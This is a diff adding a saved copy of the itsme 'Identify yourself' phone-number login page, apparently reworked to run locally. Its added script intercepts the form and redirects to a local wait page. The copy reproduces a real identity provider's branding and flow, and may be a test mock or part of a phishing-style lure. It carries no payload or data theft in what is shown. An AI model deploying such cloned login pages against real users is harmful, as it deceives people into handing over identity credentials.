@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<!-- saved from url=(0063)https://merchant.itsme.be/oidc/authorization/phone/confirmation -->
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <meta property="debug:language_value" content="en" />
+    <meta property="debug:language_origin" content="SERVICE_PROVIDER" />
+    <meta property="debug:error_message" content="" />
+
+    <!--<base href="https://merchant.itsme.be/oidc/static/v325/">-->
+    <base href="." />
+
+    <title>Identify yourself</title>
+
+    <link href="./step1_files/css" rel="stylesheet" />
+
+    <link type="text/css" rel="stylesheet" href="./step1_files/app.css" />
+
+    <style></style>
+  </head>
+
+  <body data-new-gr-c-s-check-loaded="14.1086.0" data-gr-ext-installed="">
+    <div
+      role="dialog"
+      aria-live="polite"
+      aria-label="cookieconsent"
+      aria-describedby="cookieconsent:desc"
+      class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-left cc-color-override--1813495628 cc-invisible"
+      style="display: none"
+    >
+      <!--googleoff: all--><span id="cookieconsent:desc" class="cc-message"
+        >This website uses cookies to enhance your browsing experience.
+        <a
+          aria-label="learn more about cookies"
+          role="button"
+          tabindex="0"
+          class="cc-link"
+          href="https://www.cookiesandyou.com/"
+          rel="noopener noreferrer nofollow"
+          target="_blank"
+          >More information.</a
+        ></span
+      >
+      <div class="cc-compliance">
+        <a
+          aria-label="dismiss cookie message"
+          role="button"
+          tabindex="0"
+          class="cc-btn cc-dismiss"
+          >Proceed</a
+        >
+      </div>
+      <!--googleon: all-->
+    </div>
+    <div class="container container-fill identify-yourself">
+      <header>
+        <div class="row">
+          <div class="col-lg-3 offset-lg-0 col-md-5 offset-md-2 col-8 offset-0">
+            <a href="https://www.itsme.be/en" target="_blank">
+              <img src="./step1_files/logo.svg" alt="logo" />
+            </a>
+          </div>
+
+          <div class="col-lg-3 offset-lg-6 col-md-3 col-4 offset-0">
+            <select
+              id="select_g1"
+              name="select_g1"
+              class="language-picker"
+              onchange="handleChangeLanguage(this)"
+            >
+              <option value="en" selected="true">en</option>
+
+              <option value="nl">nl</option>
+
+              <option value="fr">fr</option>
+
+              <option value="de">de</option>
+            </select>
+          </div>
+        </div>
+      </header>
+
+      <main>
+        <div class="row">
+          <div class="col-lg-5 offset-lg-0 col-md-8 offset-md-2 form-container">
+            <div class="page_heading">
+              <h1>Identify yourself</h1>
+            </div>
+
+            <form
+              method="post"
+              id="phoneForm"
+              name="phoneForm"
+              novalidate="true"
+            >
+              <div class="form-group">
+                <label for="input-phone-number">Mobile phone number</label>
+
+                <div
+                  class="js-phone-number"
+                  data-selected-country="BE"
+                  data-locale="en"
+                >
+                  <div class="input-group">
+                    <div
+                      class="input-group-prepend input-phone-number-prepend js-phone-number-prefix"
+                      tabindex="1"
+                      role="button"
+                      aria-expanded="false"
+                      aria-label="Select your country calling code"
+                      aria-haspopup="listbox"
+                    >
+                      <span class="input-group-text" id="prefix-addon"
+                        >BE (+32)</span
+                      >
+                      <span class="dots"></span>
+                    </div>
+
+                    <input
+                      id="form_telephoneNumber"
+                      name="phoneNumber"
+                      type="tel"
+                      class="form-control input-phone-number"
+                      aria-describedby="prefix-addon"
+                    />
+                    <input
+                      id="phoneCountryCode"
+                      name="phoneCountryCode"
+                      type="hidden"
+                      class="input-phone-number-prefix"
+                      value="32"
+                    />
+                  </div>
+
+                  <p class="error-msg collapsed">This field in invalid</p>
+                </div>
+              </div>
+
+              <label class="form-check checkbox-container" for="remember-phone">
+                Remember my phone number?
+                <input
+                  type="checkbox"
+                  id="remember-phone"
+                  name="remember-phone"
+                />
+                <span
+                  role="checkbox"
+                  tabindex="3"
+                  aria-checked="false"
+                  class="custom-checkbox"
+                ></span>
+              </label>
+
+              <input
+                id="state"
+                name="state"
+                type="hidden"
+                value="OMjQHjxgMixBwkFGBkxx"
+              />
+
+              <button
+                id="phoneSubmit"
+                name="phoneSubmit"
+                type="submit"
+                class="btn btn-primary"
+                tabindex="4"
+              >
+                send
+              </button>
+            </form>
+          </div>
+
+          <div class="col-lg-5 offset-lg-2 intro-container">
+            <div
+              class="animation animation-identify-yourself"
+              id="animation-identify-yourself"
+            >
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                viewBox="0 0 274 218"
+                width="274"
+                height="218"
+                preserveAspectRatio="xMidYMid meet"
+                style="
+                  width: 100%;
+                  height: 100%;
+                  transform: translate3d(0px, 0px, 0px);
+                "
+              >
+                <defs>
+                  <clippath id="__lottie_element_2">
+                    <rect width="274" height="218" x="0" y="0"></rect>
+                  </clippath>
+                  <mask id="__lottie_element_34" mask-type="alpha">
+                    <g
+                      transform="matrix(1,0,0,1,0,0)"
+                      opacity="1"
+                      style="display: block"
+                    >
+                      <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                        <path
+                          fill="rgb(138,207,219)"
+                          fill-opacity="1"
+                          d=" M12,0 C12,0 70,0 70,0 C70,0 70,54 70,54 C70,54 12,54 12,54 C5.369999885559082,54 0,48.630001068115234 0,42 C0,42 0,12 0,12 C0,5.369999885559082 5.369999885559082,0 12,0z"
+                        ></path>
+                      </g>
+                    </g>
+                  </mask>
+                </defs>
+                <g clip-path="url(#__lottie_element_2)">
+                  <g
+                    transform="matrix(1,0,0,1,92,201)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        fill-opacity="0"
+                        stroke="rgb(1,3,3)"
+                        stroke-opacity="1"
+                        stroke-width="4"
+                        d=" M0,15 C0,15 90,15 90,15 M45,0 C45,0 45,14 45,14"
+                      ></path>
+                      <g opacity="1" transform="matrix(1,0,0,1,0,15)"></g>
+                      <g opacity="1" transform="matrix(1,0,0,1,45,0)"></g>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,137,141)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        fill-opacity="0"
+                        stroke="rgb(1,3,3)"
+                        stroke-opacity="1"
+                        stroke-width="4"
+                        d=" M75,-48 C75,-48 75,48 75,48 C75,54.622798919677734 69.622802734375,60 63,60 C63,60 -63,60 -63,60 C-69.622802734375,60 -75,54.622798919677734 -75,48 C-75,48 -75,-48 -75,-48 C-75,-54.622798919677734 -69.622802734375,-60 -63,-60 C-63,-60 63,-60 63,-60 C69.622802734375,-60 75,-54.622798919677734 75,-48z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,115.97000122070312,104.11000061035156)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(255,70,17)"
+                        fill-opacity="1"
+                        d=" M40.630001068115234,12.15999984741211 C40.630001068115234,12.15999984741211 30.770000457763672,2.299999952316284 30.770000457763672,2.299999952316284 C28.959999084472656,0.49000000953674316 25.459999084472656,-0.44999998807907104 22.989999771118164,0.20999999344348907 C22.989999771118164,0.20999999344348907 9.520000457763672,3.819999933242798 9.520000457763672,3.819999933242798 C7.039999961853027,4.480000019073486 4.480000019073486,7.039999961853027 3.819999933242798,9.520000457763672 C3.819999933242798,9.520000457763672 0.20999999344348907,22.989999771118164 0.20999999344348907,22.989999771118164 C-0.44999998807907104,25.459999084472656 0.49000000953674316,28.959999084472656 2.2899999618530273,30.770000457763672 C2.2899999618530273,30.770000457763672 12.15999984741211,40.630001068115234 12.15999984741211,40.630001068115234 C13.970000267028809,42.43000030517578 17.469999313354492,43.369998931884766 19.940000534057617,42.709999084472656 C19.940000534057617,42.709999084472656 33.40999984741211,39.099998474121094 33.40999984741211,39.099998474121094 C35.880001068115234,38.439998626708984 38.45000076293945,35.880001068115234 39.11000061035156,33.40999984741211 C39.11000061035156,33.40999984741211 42.720001220703125,19.940000534057617 42.720001220703125,19.940000534057617 C43.380001068115234,17.469999313354492 42.439998626708984,13.970000267028809 40.630001068115234,12.15999984741211"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,123.87000274658203,111.44999694824219)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(253,253,253)"
+                        fill-opacity="1"
+                        d=" M21.86,16.08 C19.08,16.08 16.99,17.66 16.42,20.33 C16.26,17.83 14.69,16.34 12.37,16.34 C10.74,16.34 9.68,17.07 9.06,18.06 C8.35,16.95 7.17,16.34 5.69,16.34 C4.33,16.34 0,16.17 0,21.79 C0,21.91 0,22.01 0.01,22.12 C0.01,22.12 0,22.13 0,22.13 C0,22.13 0,25.89 0,25.89 C0,26.74 0.68,27.42 1.52,27.42 C2.35,27.42 3.03,26.74 3.03,25.89 C3.03,25.89 3.03,21.39 3.03,21.39 C3.03,20.08 3.76,19.2 4.97,19.2 C6.07,19.2 6.71,19.98 6.71,21.37 C6.71,21.37 6.71,25.89 6.71,25.89 C6.71,26.74 7.39,27.42 8.23,27.42 C9.07,27.42 9.74,26.74 9.74,25.89 C9.74,25.89 9.74,21.01 9.74,21.01 C9.87,19.91 10.54,19.2 11.62,19.2 C12.78,19.2 13.4,19.98 13.4,21.37 C13.4,21.37 13.4,25.89 13.4,25.89 C13.4,26.74 14.08,27.42 14.92,27.42 C15.76,27.42 16.44,26.74 16.44,25.89 C16.44,25.89 16.44,23.49 16.44,23.49 C17.03,26.11 19.12,27.68 21.94,27.68 C23.27,27.68 24.53,27.27 25.45,26.59 C25.48,26.57 25.5,26.54 25.54,26.52 C25.57,26.49 25.61,26.47 25.64,26.44 C25.65,26.44 25.65,26.43 25.65,26.43 C25.7,26.39 25.75,26.35 25.8,26.3 C26.69,25.48 26.18,23.97 24.98,23.81 C24.46,23.74 23.93,23.97 23.62,24.41 C23.62,24.42 23.62,24.42 23.62,24.42 C23.27,24.88 22.67,25.14 21.86,25.14 C20.45,25.14 19.62,24.25 19.56,22.87 C19.56,22.87 26.13,22.87 26.13,22.87 C26.67,22.87 27.11,22.42 27.11,21.87 C27.11,21.87 27.11,21.62 27.11,21.62 C27.11,18.15 25.03,16.08 21.86,16.08z M19.56,20.77 C19.65,19.35 20.52,18.53 21.84,18.53 C23.24,18.53 23.93,19.41 23.99,20.77 C23.99,20.77 19.56,20.77 19.56,20.77z M1.96,0 C2.9,0 3.66,0.76 3.66,1.73 C3.66,2.67 2.9,3.43 1.96,3.43 C1.01,3.43 0.27,2.67 0.27,1.73 C0.27,0.76 1.04,0 1.96,0 C1.96,0 1.96,0 1.96,0z M5.02,12.54 C5.84,12.53 6.57,12.12 6.65,11.05 C6.65,11.05 6.71,2.45 6.71,2.45 C6.71,1.94 7.12,1.52 7.63,1.52 C7.63,1.52 8.89,1.52 8.89,1.52 C9.4,1.52 9.82,1.94 9.81,2.47 C9.81,2.47 9.81,3.93 9.81,3.93 C10.06,3.77 10.36,3.67 10.67,3.67 C11.62,3.67 12.37,4.44 12.37,5.4 C12.37,6.34 11.62,7.11 10.67,7.11 C10.34,7.11 10.04,7.01 9.78,6.85 C9.78,6.85 9.76,10.86 9.76,10.86 C9.76,12.05 10.5,12.51 11.35,12.54 C12.51,12.54 13.1,11.86 13.1,11.86 C13.1,11.86 13.11,11.87 13.11,11.87 C13.37,11.6 13.73,11.43 14.16,11.44 C14.16,11.44 14.16,11.44 14.16,11.44 C14.69,11.45 15.2,11.72 15.43,12.2 C15.64,12.62 16.07,12.91 16.78,12.96 C17.63,13.03 18.19,12.7 18.24,12.06 C18.29,11.39 17.9,11.14 16.34,10.63 C14.05,9.85 12.53,9.24 12.71,6.96 C12.87,4.83 14.61,3.58 17.37,3.79 C18.94,3.92 20.05,4.49 20.73,5.35 C21.49,6.3 20.75,7.71 19.55,7.69 C19.02,7.68 18.53,7.37 18.3,6.88 C18.11,6.5 17.74,6.25 17.14,6.2 C16.31,6.13 15.86,6.45 15.82,7.04 C15.76,7.82 16.58,7.99 17.87,8.44 C20.01,9.19 21.51,10 21.36,12.02 C21.19,14.28 19.44,15.59 16.58,15.37 C15.52,15.29 14.64,15.03 13.96,14.62 C12.97,15.19 11.99,15.36 10.65,15.37 C9.32,15.36 8.23,15 7.52,14.23 C6.97,14.89 6.18,15.36 5.02,15.37 C2.26,15.36 0.25,14.2 0.27,11.61 C0.27,11.61 0.33,5.42 0.33,5.42 C0.33,5.08 0.6,4.8 0.94,4.8 C0.94,4.8 2.82,4.8 2.82,4.8 C3.16,4.8 3.44,5.08 3.44,5.43 C3.44,5.43 3.38,10.86 3.38,10.86 C3.38,12.08 4.16,12.53 5.02,12.54 C5.02,12.54 5.02,12.54 5.02,12.54z"
+                      ></path>
+                      <g
+                        opacity="1"
+                        transform="matrix(1,0,0,1,0,16.079999923706055)"
+                      ></g>
+                      <g
+                        opacity="1"
+                        transform="matrix(1,0,0,1,19.559999465942383,18.530000686645508)"
+                      ></g>
+                      <g
+                        opacity="1"
+                        transform="matrix(1,0,0,1,0.27000001072883606,0)"
+                      ></g>
+                      <g
+                        opacity="1"
+                        transform="matrix(1,0,0,1,0.27000001072883606,1.5199999809265137)"
+                      ></g>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,62,171)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        fill-opacity="0"
+                        stroke="rgb(1,3,3)"
+                        stroke-opacity="1"
+                        stroke-width="4"
+                        d=" M0,0 C0,0 150,0 150,0"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,137,186)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        fill-opacity="0"
+                        stroke="rgb(1,3,3)"
+                        stroke-opacity="1"
+                        stroke-width="4"
+                        d=" M0,-5 C2.759500026702881,-5 5,-2.759500026702881 5,0 C5,2.759500026702881 2.759500026702881,5 0,5 C-2.759500026702881,5 -5,2.759500026702881 -5,0 C-5,-2.759500026702881 -2.759500026702881,-5 0,-5z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(0.7071067690849304,0.7071067690849304,-0.7071067690849304,0.7071067690849304,137.5,51.50002670288086)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(255,255,255)"
+                        fill-opacity="1"
+                        d=" M9.5,-7.5 C9.5,-7.5 9.5,7.5 9.5,7.5 C9.5,8.603799819946289 8.603799819946289,9.5 7.5,9.5 C7.5,9.5 -7.5,9.5 -7.5,9.5 C-8.603799819946289,9.5 -9.5,8.603799819946289 -9.5,7.5 C-9.5,7.5 -9.5,-7.5 -9.5,-7.5 C-9.5,-8.603799819946289 -8.603799819946289,-9.5 -7.5,-9.5 C-7.5,-9.5 7.5,-9.5 7.5,-9.5 C8.603799819946289,-9.5 9.5,-8.603799819946289 9.5,-7.5z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,137,27)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(255,255,255)"
+                        fill-opacity="1"
+                        d=" M137,-15 C137,-15 137,15 137,15 C137,21.622800827026367 131.622802734375,27 125,27 C125,27 -125,27 -125,27 C-131.622802734375,27 -137,21.622800827026367 -137,15 C-137,15 -137,-15 -137,-15 C-137,-21.622800827026367 -131.622802734375,-27 -125,-27 C-125,-27 125,-27 125,-27 C131.622802734375,-27 137,-21.622800827026367 137,-15z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g mask="url(#__lottie_element_34)" style="display: block">
+                    <g transform="matrix(1,0,0,1,0,0)" opacity="1">
+                      <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                        <path
+                          fill="rgb(138,207,219)"
+                          fill-opacity="1"
+                          d=" M12,0 C12,0 70,0 70,0 C70,0 70,54 70,54 C70,54 12,54 12,54 C5.369999885559082,54 0,48.630001068115234 0,42 C0,42 0,12 0,12 C0,5.369999885559082 5.369999885559082,0 12,0z"
+                        ></path>
+                      </g>
+                    </g>
+                  </g>
+                  <g
+                    style="display: block"
+                    transform="matrix(1,0,0,1,35,27)"
+                    opacity="1"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(255,255,255)"
+                        fill-opacity="1"
+                        d=" M20,0 C20,0 20,0 20,0 C20,2.759500026702881 17.75950050354004,5 15,5 C15,5 -15,5 -15,5 C-17.75950050354004,5 -20,2.759500026702881 -20,0 C-20,0 -20,0 -20,0 C-20,-2.759500026702881 -17.75950050354004,-5 -15,-5 C-15,-5 15,-5 15,-5 C17.75950050354004,-5 20,-2.759500026702881 20,0z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,90,27)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(45,49,49)"
+                        fill-opacity="1"
+                        d=" M0,-5 C2.759500026702881,-5 5,-2.759500026702881 5,0 C5,2.759500026702881 2.759500026702881,5 0,5 C-2.759500026702881,5 -5,2.759500026702881 -5,0 C-5,-2.759500026702881 -2.759500026702881,-5 0,-5z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,106,27)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(45,49,49)"
+                        fill-opacity="1"
+                        d=" M0,-5 C2.759500026702881,-5 5,-2.759500026702881 5,0 C5,2.759500026702881 2.759500026702881,5 0,5 C-2.759500026702881,5 -5,2.759500026702881 -5,0 C-5,-2.759500026702881 -2.759500026702881,-5 0,-5z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,122,27)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(45,49,49)"
+                        fill-opacity="1"
+                        d=" M0,-5 C2.759500026702881,-5 5,-2.759500026702881 5,0 C5,2.759500026702881 2.759500026702881,5 0,5 C-2.759500026702881,5 -5,2.759500026702881 -5,0 C-5,-2.759500026702881 -2.759500026702881,-5 0,-5z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,147,27)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(45,49,49)"
+                        fill-opacity="1"
+                        d=" M0,-5 C2.759500026702881,-5 5,-2.759500026702881 5,0 C5,2.759500026702881 2.759500026702881,5 0,5 C-2.759500026702881,5 -5,2.759500026702881 -5,0 C-5,-2.759500026702881 -2.759500026702881,-5 0,-5z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,163,27)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(45,49,49)"
+                        fill-opacity="1"
+                        d=" M0,-5 C2.759500026702881,-5 5,-2.759500026702881 5,0 C5,2.759500026702881 2.759500026702881,5 0,5 C-2.759500026702881,5 -5,2.759500026702881 -5,0 C-5,-2.759500026702881 -2.759500026702881,-5 0,-5z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,188,27)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(45,49,49)"
+                        fill-opacity="1"
+                        d=" M0,-5 C2.759500026702881,-5 5,-2.759500026702881 5,0 C5,2.759500026702881 2.759500026702881,5 0,5 C-2.759500026702881,5 -5,2.759500026702881 -5,0 C-5,-2.759500026702881 -2.759500026702881,-5 0,-5z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,204,27)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(45,49,49)"
+                        fill-opacity="1"
+                        d=" M0,-5 C2.759500026702881,-5 5,-2.759500026702881 5,0 C5,2.759500026702881 2.759500026702881,5 0,5 C-2.759500026702881,5 -5,2.759500026702881 -5,0 C-5,-2.759500026702881 -2.759500026702881,-5 0,-5z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,229,27)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(45,49,49)"
+                        fill-opacity="1"
+                        d=" M0,-5 C2.759500026702881,-5 5,-2.759500026702881 5,0 C5,2.759500026702881 2.759500026702881,5 0,5 C-2.759500026702881,5 -5,2.759500026702881 -5,0 C-5,-2.759500026702881 -2.759500026702881,-5 0,-5z"
+                      ></path>
+                    </g>
+                  </g>
+                  <g
+                    transform="matrix(1,0,0,1,245,27)"
+                    opacity="1"
+                    style="display: block"
+                  >
+                    <g opacity="1" transform="matrix(1,0,0,1,0,0)">
+                      <path
+                        fill="rgb(45,49,49)"
+                        fill-opacity="1"
+                        d=" M0,-5 C2.759500026702881,-5 5,-2.759500026702881 5,0 C5,2.759500026702881 2.759500026702881,5 0,5 C-2.759500026702881,5 -5,2.759500026702881 -5,0 C-5,-2.759500026702881 -2.759500026702881,-5 0,-5z"
+                      ></path>
+                    </g>
+                  </g>
+                </g>
+              </svg>
+            </div>
+            <h5>Enter your mobile phone number</h5>
+            <p>Click ‘send’ and open your itsme<sup>®</sup> app.</p>
+          </div>
+        </div>
+      </main>
+
+      <div id="modal" class="backlayer" data-type="phonenumber" data-locale="">
+        <div class="modal_content">
+          <div class="modal_header">
+            <h2>Select your country</h2>
+            <input
+              type="text"
+              class="search"
+              placeholder="Search"
+              tabindex="5"
+              aria-expanded="true"
+            />
+          </div>
+          <div class="modal_body">
+            <div class="most-selected-countries">
+              <h3>Most selected countries</h3>
+              <ul class="countries" tabindex="6" role="listbox"></ul>
+            </div>
+            <div class="all-countries">
+              <h3>A-Z</h3>
+              <ul class="countries" tabindex="7" role="listbox"></ul>
+            </div>
+          </div>
+          <div class="modal_footer"></div>
+          <div class="modal_close"></div>
+        </div>
+      </div>
+
+      <div class="curved-background">
+        <div class="curve"></div>
+      </div>
+    </div>
+
+    <div id="forest-ext-shadow-host"></div>
+    <script>
+      const element = document.getElementById("phoneForm");
+
+      element.addEventListener(
+        "click",
+        (e) => {
+          e.preventDefault();
+          window.location = `/itsme/wait.html${window.location.search}`;
+        },
+        false
+      );
+    </script>
+  </body>
+</html>
